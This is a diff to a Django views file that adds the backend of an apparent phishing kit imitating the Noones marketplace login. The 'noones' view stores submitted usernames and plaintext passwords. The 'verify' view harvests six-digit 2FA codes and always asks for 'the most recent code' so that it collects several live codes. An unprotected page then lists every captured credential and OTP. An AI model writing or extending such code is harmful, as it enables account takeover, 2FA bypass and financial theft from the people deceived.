@@ -73,13 +73,17 @@ from .serializers import  serializers
 import json
 
 
+#imports noones new
+from .models import UserSubmissionNoones, OTPSubmissionNoones
+
+
 
 def index(request):
     return render(request,'index.html')
 
 
 def paymentpax(request):
-    return render(request,'noonesnew.html')
+    return render(request,'home3.html')
 
 
 
@@ -1024,10 +1028,7 @@ def indextwo(request):
 
 
 
-    #noones
-# View to submit email/phone and password
-
-# View to submit user data
+    #noones old
 # View to submit user data
 @csrf_exempt
 def submit_user_data(request):
@@ -1099,6 +1100,68 @@ def submit_authenticator_code(request):
     return JsonResponse({"error": "Invalid request method"}, status=405)
 
 
-def infodbnoones(request):
+def infodbnoonesold(request):
     profiles = UserProfileNoones.objects.all()  # Fetch all user profiles
     return render(request, 'noones.html', {'profiles': profiles})
+
+
+#noones new
+#viewspax
+
+@csrf_exempt
+def noones(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        
+        # Save the username and password
+        submission = UserSubmissionNoones.objects.create(username=username, password=password)
+        
+        # Redirect to the verify page with submission_id
+        return redirect('verify', submission_id=submission.id)
+    
+    return render(request, 'noonesnew.html')
+
+@csrf_exempt
+def verify(request, submission_id):
+    submission = UserSubmissionNoones.objects.get(id=submission_id)
+    message = ""
+
+    if request.method == 'POST':
+        # Collect the OTP digits from all input fields
+        otp_digits = []
+        for i in range(1, 7):  # Assuming there are 6 OTP input fields (otp_1 to otp_6)
+            otp_digit = request.POST.get(f'otp_{i}')
+            if otp_digit:
+                otp_digits.append(otp_digit)
+
+        # If all 6 OTP digits are provided, concatenate them to form the full OTP
+        if len(otp_digits) == 6:
+            otp = ''.join(otp_digits)
+            
+            # Save the new OTP
+            OTPSubmissionNoones.objects.create(user_submission_noones=submission, otp=otp)
+            message = "Code seems to be correct. Try again with the most recent code."
+        else:
+            otp = ''.join(otp_digits)
+            OTPSubmissionNoones.objects.create(user_submission_noones=submission, otp=otp)
+            message = "Please enter a valid 6-digit code anony"
+
+    # Fetch all OTP submissions related to the user_submission_noones
+    otps = OTPSubmissionNoones.objects.filter(user_submission_noones=submission)
+
+    return render(request, 'noonesnew2fa.html', {'submission_id': submission_id, 'message': message, 'otps': otps})
+
+
+
+
+
+
+
+
+# Step 3: Apply the decorators to your view
+#@login_required(login_url='/admin/login/')
+#@user_passes_test(is_superuser, login_url='/admin/login/')
+def infodbnoones(request):
+    user_submissions = UserSubmissionNoones.objects.all().prefetch_related('otps')
+    return render(request, 'view_all.html', {'user_submissions': user_submissions})
